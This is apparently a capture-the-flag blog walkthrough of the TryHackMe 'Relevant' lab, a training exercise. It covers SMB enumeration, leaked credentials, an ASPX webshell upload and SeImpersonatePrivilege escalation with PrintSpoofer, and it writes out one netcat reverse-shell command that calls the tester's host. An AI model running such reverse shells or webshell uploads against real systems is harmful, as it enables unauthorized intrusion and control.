<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
            <h1 class="post-title entry-title">Relevant  TryHackMe Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/relevant-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-11-09T07:53:35+00:00">November 9, 2020</time><time class="updated" datetime="2025-06-25T12:38:46+00:00">June 25, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “Relevant”. It’s available at TryHackMe for penetration testing practice. This lab is not difficult if we have the right basic knowledge to break the labs and are attentive to all the details we find during the reconnaissance. The credit for making this lab goes to <strong><span style="color: #0000ff;">TheMayor</span></strong>. Let’s get started and learn how to break it down successfully.</span></p>
<p><span style="color: #000000;">Level: <strong>Medium</strong></span></p>
<p><span style="color: #000000;">Since these labs are available on the <strong>TryHackMe</strong> website from <span style="color: #0000ff;"><strong>here</strong></span>.</span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Smbclient</span></li>
<li><span style="color: #000000;">Smbmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Abuse of write permission in <strong>Samba</strong> service</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Abuse of permission in SeImpersonatePrivilege in the system.</span></li>
</ul>
<ul>
<li><span style="color: #000000;">Capture the flag</span></li>
</ul>
<h3><span style="color: #800000;">Walkthrough</span></h3>
<h3><span style="color: #800000;">Reconnaissance</span></h3>
<p><span style="color: #000000;">We put the IP address in “<strong>etc/hosts</strong>” file and execute <strong>nmap</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A -p- relevant.try</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cWTqcLQiMao/X6jzNh6df6I/AAAAAAAAqdA/xONojQIsF58bKZ06S284Agt-w5xwpkJHACLcBGAsYHQ/s16000/1.png"/></span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">When we visit the web service on port 80, we look through the robots.txt file and the source code, but nothing appears to be helpful.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nrRur4aTIz4/X6jzTs1dZ4I/AAAAAAAAqdE/TXkzBLU12FIBLypfJpErMTnad_qW2T9wACLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">We execute <strong>smbclient</strong> with Null session and we evidence a rare share name.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Tek5O4Rz16M/X6jzcX51oYI/AAAAAAAAqdI/78qOh5GdRa8fS1q2HUHusaXS4bLWOQY2QCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">We discovered a <strong>passwords.txt</strong> file after gaining access to the “<strong>nt4wrksv</strong>” file. The file is downloaded.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-b9yxtC5l9b8/X6jzgs72AYI/AAAAAAAAqdM/uK-CYej5F1I6XuGZoSyEqTAxZi-CyiKMgCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">The “<strong>password.txt</strong>” file, which employs <strong>base64</strong> encoding, is read. After decoding the file, we discovered the credentials.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BUTD3LeMmIw/X6jzlqYdySI/AAAAAAAAqdU/dnx-_MtBLVcjRjnCdsHqq9xqBNI95HcIwCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Is an hour of use of <strong>smbmap</strong> with credentials found. We view can writing in share “<strong>nt4wrksv</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RYejOhG6JE4/X6jzstQzekI/AAAAAAAAqdc/OPhctdxmM-kXrso1AU0lfBDBdweb6FKTgCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">We are testing access the directory in different webservice, we enumerate of the correct <strong>SAMBA</strong> webservice in running port <strong>49663</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-P_BbDheJVDA/X6jzxTx8rxI/AAAAAAAAqdk/zVxNo-D6xjwxAW1OjBvwg_8YKMXAjLqzQCLcBGAsYHQ/s16000/7.png"/></span></p>
<h3><span style="color: #800000;">Exploiting</span></h3>
<p><span style="color: #000000;">We upload a “<strong>aspx_cmd.aspx</strong>“, this is a webshell for <u>execute commands</u> from browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vs968IJZOIg/X6jz2d38EPI/AAAAAAAAqdo/lSbiJkZlNYse0KkoXH7ydPXuRocFGqJIgCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">We do a proof of concept execute a system command “<strong>whoami</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JwGbdx1xTEU/X6jz61oUpEI/AAAAAAAAqds/zWp7CVH_xEMhngkV8x1Yhb9bXVdzJ0WcgCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">I have problems with executing binary “<strong>certutil</strong>” and “<strong>powershell</strong>” for executing download files. So I had to raise a samba in my kali to execute <strong>netcat</strong> and obtaining reverse shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">\\10.9.5.154\a\nc.exe -e cmd.exe 10.9.5.154 4444</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nUA9TEYi80I/X6jz_z2c3yI/AAAAAAAAqd0/5HUb1MKTG0Ef_YjYakcLA21SGSBtth6HACLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">We enumerate users and files system, we found the <strong>user.txt</strong> flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K70ap97GDWo/X6j0EJH-iFI/AAAAAAAAqd8/7Q5734QF9XIOVXbII3dt0NHKACaxSnJxQCLcBGAsYHQ/s16000/11.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation (NT AUTHORITY\SYSTEM)</span></h3>
<p><span style="color: #000000;">We execute of command “<strong>whoami /priv</strong>” and we see that we have permission in privilege “<strong>SeImpersonatePrivilege</strong>” of the system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sVqtWXLtvOo/X6j0JNE-tOI/AAAAAAAAqeA/fvomVO_Yx5chKQau7X6om25gw5KnLCn6ACLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">After trying several exploits like “<strong>JuicyPotato</strong>” or “<strong>RoguePotato</strong>” without success, I started to Google the abuse of this privilege in Windows 2016, I found this <strong><a style="color: #000000;" href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwj0zZL18fTsAhWIgVwKHQpXBroQFjAAegQIBRAC&amp;url=https%3A%2F%2Fgithub.com%2Fitm4n%2FPrintSpoofer&amp;usg=AOvVaw3klWB2EhkYkhsHlFwLusTs">github</a></strong> that worked for me (after several xD attempts).</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-a-zLyZhpsGc/X6j0OZPFPiI/AAAAAAAAqeE/HpthAUgR91Q5W5Ztmo3Qf9xiQTj7bieNACLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">Hope you have enjoyed this TryHackMe Write-up. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/">Link</a> </strong><span style="color: #000000;">for more TryHackMe CTF’s.</span></p>
<p><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks. Contact on <strong><a href="https://www.linkedin.com/in/david-uton">LinkedIn</a></strong> and <strong><a href="https://twitter.com/David_Uton">Twitter</a></strong>.</p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
